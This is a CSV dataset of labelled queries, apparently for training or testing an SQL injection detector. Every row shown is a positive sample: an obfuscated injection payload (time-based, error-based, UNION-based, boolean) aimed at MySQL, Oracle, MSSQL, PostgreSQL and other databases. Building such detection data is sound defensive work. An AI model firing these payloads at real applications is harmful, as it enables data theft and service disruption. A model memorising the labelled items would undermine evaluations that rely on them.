Query,Label
"1   )    )    oorr row  (  1045,7562  )  >  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  selecselectt 8488 uniounionn selecselectt 5584 uniounionn selecselectt 3051 uniounionn selecselectt 1210  )  a group bbyy x  )   anandd    (    (   8294  =  8294",1
"1'   )    )    aandnd make_sesett  (  8403  =  8403,8899  )   aandnd    (    (   'sxgl'  =  'sxgl",1
1'   )    )    as xirr wherwheree 2425  =  2425,1
"1'   )    )    ununionion all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
1' rllikeike   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  vwyq  )  #,1
1'   )    )    as cmll whewherere 7948  =  7948 aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   anandd    (    (   ""jzbb""  =  ""jzbb",1
"1'   )    )    as xrre whwhereere 1172  =  1172 aandnd updatupdateexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selselectect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"1,  (  begiinn if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"1'||  (  selselectect 'yhkt' frfromom dual whwhereere 7105  =  7105 oorr row  (  1045,7562  )  >  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom   (  selselectect 8488 uniounionn selselectect 5584 uniounionn selselectect 3051 uniounionn selselectect 1210  )  a group bbyy x   )    )   ||'",1
"1'   )    )     )   oorr elt  (  6272  =  6272,sleep  (  5   )    )    anandd    (    (     (  'pded'  =  'pded",1
1  )   anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  3836  =  3836,1
"1' oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    aandnd 'ntaw'  =  'ntaw",1
"1%""   )    )    anandd   (  3020  =  3020  )  *6703 anandd    (    (   ""%""  =  """,1
1%'   )    )    anandd 4595  =  4595#,1
"exp  (  ~  (  selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1   )    )    as avdz wherwheree 1881  =  1881 anandd 6510  =    (  seleselectct count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'+  (  seleselectct 'stdl' wwherehere 4581  =  4581,1
1%'   )    )    anandd 2006  =  2006,1
"1%""  )   ununionion all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
1   )    )    as dqfl whewherere 7527  =  7527,1
"1' iinn boolean mode  )   oorr 5356  =    (  seleselectct count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )    anandd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
seselectlect case when 7717  =  7717 then 1 else nunullll end--,1
"1%""  )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd   (  ""%""  =  """,1
"  (  selselectect * frofromm generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limlimitit 1  )  ",1
"1  )   as vzyk wherwheree 5103  =  5103 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1' oorr updaupdatetexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   anandd 'vvkl'  =  'vvkl",1
"1'   )    )    aandnd 4241  =  convert  (  iinnt,  (  seselectlect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (   'wzrj'  =  'wzrj",1
"1'  )   oorr row  (  1045,7562  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom   (  seselectlect 8488 uunionnion seselectlect 5584 uunionnion seselectlect 3051 uunionnion seselectlect 1210  )  a group bbyy x  )   aandnd   (  'cogk'  =  'cogk",1
"-1692'  )   uunionnion all sselectelect 7074,7074,7074,7074,7074,7074,7074#",1
1'||  (  selselectect 'nvvm' frofromm dual whewherere 5567  =  5567 rlilikeke   (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1
"1""  )   as sraw whwhereere 1997  =  1997 aandnd   (  selecselectt 2*  (  if   (    (   selecselectt * ffromrom   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1""  )   whwhereere 9248  =  9248",1
"1""  )   whwhereere 9855  =  9855",1
"1 anandd 3707  =    (  selecselectt count  (  *  )   frfromom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )  -- xlfz",1
"seleselectct count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3 aandnd    (    (   ""tbcc""  =  ""tbcc",1
-7345  )   uunionnion all seselectlect 3866#,1
"1   )    )     )   uniunionon all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1%""   )    )    anandd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    anandd    (    (   ""%""  =  """,1
1' rlilikeke sleep  (  5  )  #,1
"1   )    )    as hrks wwherehere 7637  =  7637 oorr elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1' wherwheree 8469  =  8469,1
"1'   )    )    aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (   'ngwt'  =  'ngwt",1
"1'  )   as pkiiss whewherere 3446  =  3446 oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1"" whewherere 6785  =  6785 aandnd 3580  =    (  selselectect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"1%'   )    )    oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   aandnd    (    (   '%'  =  '",1
1'  )   anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
1' iinn boolean mode  )   rlilikeke   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",1
"-6440   )    )     )   uunionnion all seselectlect 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1
"-9924   )    )    as zgqa wwherehere 2867  =  2867 uunionnion all seselectlect 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
1  )   as gfhf wwherehere 5804  =  5804 oorr 6793  =    (  selselectect 6793 frofromm pg_sleep  (  5   )    )   --,1
"1""  )   as dgzf whewherere 4834  =  4834",1
-4324 oorrdeoorrderr bbyy 1--,1
"-8557 oorr 1 group bbyy concat  (  0x7171706a71,  (  sselectelect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
end--,1
"1""   )    )     )   oorr 8421  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )    anandd    (    (     (  ""ugtw""  =  ""ugtw",1
1   )    )    rllikeike   (  selselectect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    anandd    (    (   4279  =  4279,1
1%'   )    )    rliklikee sleep  (  5  )  #,1
"1' aandnd 2716  =    (  seselectlect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as fwru wwherehere 5262  =  5262 aandnd 4241  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""  )   as xwnu whwhereere 6490  =  6490 uunionnion all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
1'  )   as wpmv whewherere 1479  =  1479 anandd 3754  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )  --,1
"1 aandnd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   ",1
1' oorr   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )   anandd 'bwtk'  =  'bwtk,1
"-8754""   )    )     )   uunionnion all sselectelect 7391,7391,7391,7391,7391,7391,7391--",1
"-4406%' uniunionon all seleselectct 9599,9599,9599,9599#",1
"1  )   as rnfb whewherere 2405  =  2405 oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1  )   oorr   (  seselectlect * ffromrom   (  seselectlect  (  sleep  (  5   )    )     )  sddo  )  #,1
1 aandnd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1
"selselectect benchmark  (  5000000,md5  (  0x714e4153   )    )   #",1
"1%'  )   aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    aandnd   (  '%'  =  '",1
"-6550'  )   whewherere 1675  =  1675 uniounionn all seleselectct 1675,1675,1675,1675,1675,1675,1675--",1
"1'  )   whewherere 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
1  )   as uuro wherwheree 6784  =  6784,1
-7720   )    )    oorr 2724 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (   8254  =  8254,1
"1   )    )    aandnd row  (  6237,7469  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm   (  seselectlect 5192 uunionnion seselectlect 3785 uunionnion seselectlect 3931 uunionnion seselectlect 7158  )  a group bbyy x  )   aandnd    (    (   9325  =  9325",1
"1,  (  selselectect   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  selselectect 5154 ffromrom master..sysddatabaseatabases  )   end   )    )   ",1
"-6014"" oorr make_sesett  (  3003  =  2609,2609  )  ",1
1  )   wwherehere 6424  =  6424,1
1%' oorr sleep  (  5  )  #,1
1' oorr sleep  (  5  )   aandnd 'yudo'  =  'yudo,1
1'||  (  sselectelect 'sxya' whewherere 3578  =  3578,1
"1""   )    )     )   oorr 4411  =    (  seleselectct count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (     (  ""nrhz"" llikeike ""nrhz",1
"selecselectt * frfromom generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   llimitimit 1--",1
"1'  )   oorr   (  sselectelect 2*  (  if   (    (   sselectelect * ffromrom   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd   (  'lxoc'  =  'lxoc",1
"1' wwherehere 4150  =  4150 anandd elt  (  8012  =  6026,6026  )  --",1
"1,iif  (  6333  =  1227,1,1/0  )  ",1
"1   )    )    aandnd 8189  =    (  seleselectct count  (  *  )   frofromm sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )  --",1
"1""  )   as jqli whwhereere 7793  =  7793",1
1'   )    )     )   anandd 6991  =  5579,1
1' oorr 6793  =    (  seleselectct 6793 frofromm pg_sleep  (  5   )    ) ,1
1 wwherehere 1568  =  1568 oorr   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  sddo  )  #,1
"1  )   as idvt wwherehere 3490  =  3490 aandnd 9660  =    (  seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" aandnd 8148  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1' whewherere 1093  =  1093 ununionion all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
 (  seselectlect * ffromrom   (  seselectlect  (  sleep  (  5   )    )     )  acdk  )  #,1
1'+  (  seleselectct 'kcix' wwherehere 1117  =  1117,1
1'+  (  seleselectct 'jaok' whewherere 2592  =  2592,1
"1'   )    )    oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    anandd    (    (   'ossj'  =  'ossj",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   anandd    (    (     (  'aqdj'  =  'aqdj",1
"1"" anandd 3202  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   ",1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   anandd   (  ""pdqm"" liklikee ""pdqm",1
"1',exp  (  ~  (  seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1""   )    )    as jebl whwhereere 3464  =  3464",1
"-3632' oorr make_sesett  (  9354  =  9354,7185  )   aandnd 'lgpy' liklikee 'lgpy",1
-5147 oorr   (  8459  =  8459  )  *4906,1
"1'   )    )    uunionnion all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1""  )   as bksv whwhereere 5375  =  5375",1
"-3017""   )    )    as ljit whewherere 9128  =  9128 ununionion all sselectelect 9128,9128,9128,9128,9128--",1
"1'   )    )    oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   'dreq'  =  'dreq",1
"1%""  )   rllikeike   (  seselectlect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd   (  ""%""  =  """,1
1  )   whwhereere 6039  =  6039 aandnd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-4371'   )    )     )   uniounionn all seselectlect 7465,7465,7465,7465,7465,7465,7465#",1
1  )   anandd 7533  =  7533,1
"1  )   wwherehere 9371  =  9371 uunionnion all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1,  (  seselectlect   (  case when   (  3902  =  3902  )   then   (  seselectlect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  seselectlect 0 frofromm dual  )   end  )   frofromm dual  )  ",1
1%' uniunionon all selecselectt nunullll--,1
"1""   )    )     )   anandd 8514  =    (  selselectect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )   anandd    (    (     (  ""xtyt""  =  ""xtyt",1
"selselectect sleep  (  5  )   anandd    (    (   ""twed"" lilikeke ""twed",1
1' wherwheree 8729  =  8729,1
"1'   )    )    aandnd elt  (  4249  =  4249,7259  )   aandnd    (    (   'xjns'  =  'xjns",1
"-3667%'   )    )    uniounionn all sselectelect 3560,3560,3560--",1
"-8655  )   wherwheree 3910  =  3910 ununionion all seselectlect 3910,3910#",1
"waitfoorr delay '0:0:5' aandnd ""cvqn"" liklikee ""cvqn",1
-5569'  )   as cjaf wherwheree 3753  =  3753 ununionion all seselectlect 3753#,1
1  )   wwherehere 9078  =  9078 rllikeike sleep  (  5  )  #,1
"1'   )    )    anandd 3707  =    (  selecselectt count  (  *  )   frfromom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )   anandd    (    (   'tkcy' lilikeke 'tkcy",1
-2210' oorr 5903  =    (  'qqpjq'||  (  sselectelect case 5903 when 5903 then 1 else 0 end frfromom rdb$databasdatabasee  )  ||'qzvzq'  )   aandnd 'myvr' lilikeke 'myvr,1
"1%"" uniunionon all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
seleselectct   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  seleselectct 1868 frofromm master..sysdatabadatabaseses  )   end  )  --,1
"1'  )   as hlbq wherwheree 2347  =  2347 aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1   )    )    aandnd 8635  =    (  sselectelect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
